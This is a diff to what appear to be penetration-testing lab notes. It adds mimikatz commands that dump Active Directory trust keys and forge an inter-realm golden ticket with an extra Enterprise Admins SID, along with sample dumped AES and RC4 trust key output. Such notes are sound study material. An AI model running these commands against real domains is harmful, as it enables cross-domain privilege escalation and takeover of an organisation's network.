@@ -125,10 +125,21 @@ klist
 
 #### another way 
 
-```
+```powershell
 mimikatz.exe "privilege::debug" "lsadump::trust  /patch"
 
-.\mimikatz3.exe "kerberos::golden /user:Administrator /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-3056178012-3972705859-491075245  /sids:S-1-5-21-2734290894-461713716-141835440-519 /rc4:0540fe51ddd618f42a66ef059ac36441 /target:ZSM.LOCAL /service:krbtgt  /ticket:trust.kirbi"
+# check the keys of the output for example
+
+#Domain: ZSM.LOCAL (ZSM / S-1-5-21-2734290894-461713716-141835440)
+# [  In ] LOGISTICS.INLANEFREIGHT.LOCAL -> INLANEFREIGHT.LOCAL
+#    * 18/08/2024 10:06:16 - CLEAR   - eb 02 61 8e f7 3e f6 e1 6f a1 d5 8c a1 0e df c1 8e a4 25 11 50 c9 e0 6a 66 dc 1a 43 15 fe 4f d6 b5 b2 4e 21 3b 40 07 8a 62 c7 e8 b4 9b 7f 4a 54 4d 63 d1 94 ee e0 00 1e e3 a7 #3e 49 ab d4 63 4b 5e cb 22 3d 42 9b 48 f8 3c 5a b8 ce 5f e8 4a 99 af f7 a0 f1 a5 a0 b2 15 bb 10 7c 84 50 9f dc 2c e0 3b b7 fa 9a 1c b2 bd 96 ee da 78 69 f7 a2 17 9b e3 51 e7 1c b6 c0 90 55 b9 7e dd 56 65 17 43 #17 f0 6d c4 10 a2 79 82 94 20 98 68 7a c9 6d ae 2d 03 01 9a d1 a7 8f 9d ae 29 e6 ad 3d 3a 20 0f e5 a8 5b e2 ba 8b 83 cb 98 ee 9e 4f 93 c6 12 1f c8 c3 7e e1 3e c9 be 93 4a 99 45 28 12 2f bc 97 92 37 31 7b 76 d1 #a4 82 ab 6c 4c 7f 8e e5 1c 1e c7 6d 5e 0d 4b 5e 0e b5 64 9f fc 96 e2 80 0e 72 77 ef 1b bc 1a ff 02 e7 55 ea e2 01 85 57 5c 31 
+ #       * aes256_hmac       b4656adcc7f0e1b9b2bfa383ae098e3aaace8c59b4a756f54865336be1c934ae
+ #       * aes128_hmac       d47a943e290e5e4ef58c1010f37b4e28
+ #       * rc4_hmac_nt       ef3c6d05afaa2e14f307b03d6531e119
+
+
+# i used the keys here
+.\mimikatz3.exe "kerberos::golden /user:Administrator /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-3056178012-3972705859-491075245  /sids:S-1-5-21-2734290894-461713716-141835440-519 /rc4:ef3c6d05afaa2e14f307b03d6531e119 /target:ZSM.LOCAL /service:krbtgt  /ticket:trust.kirbi"
 
 klist
 
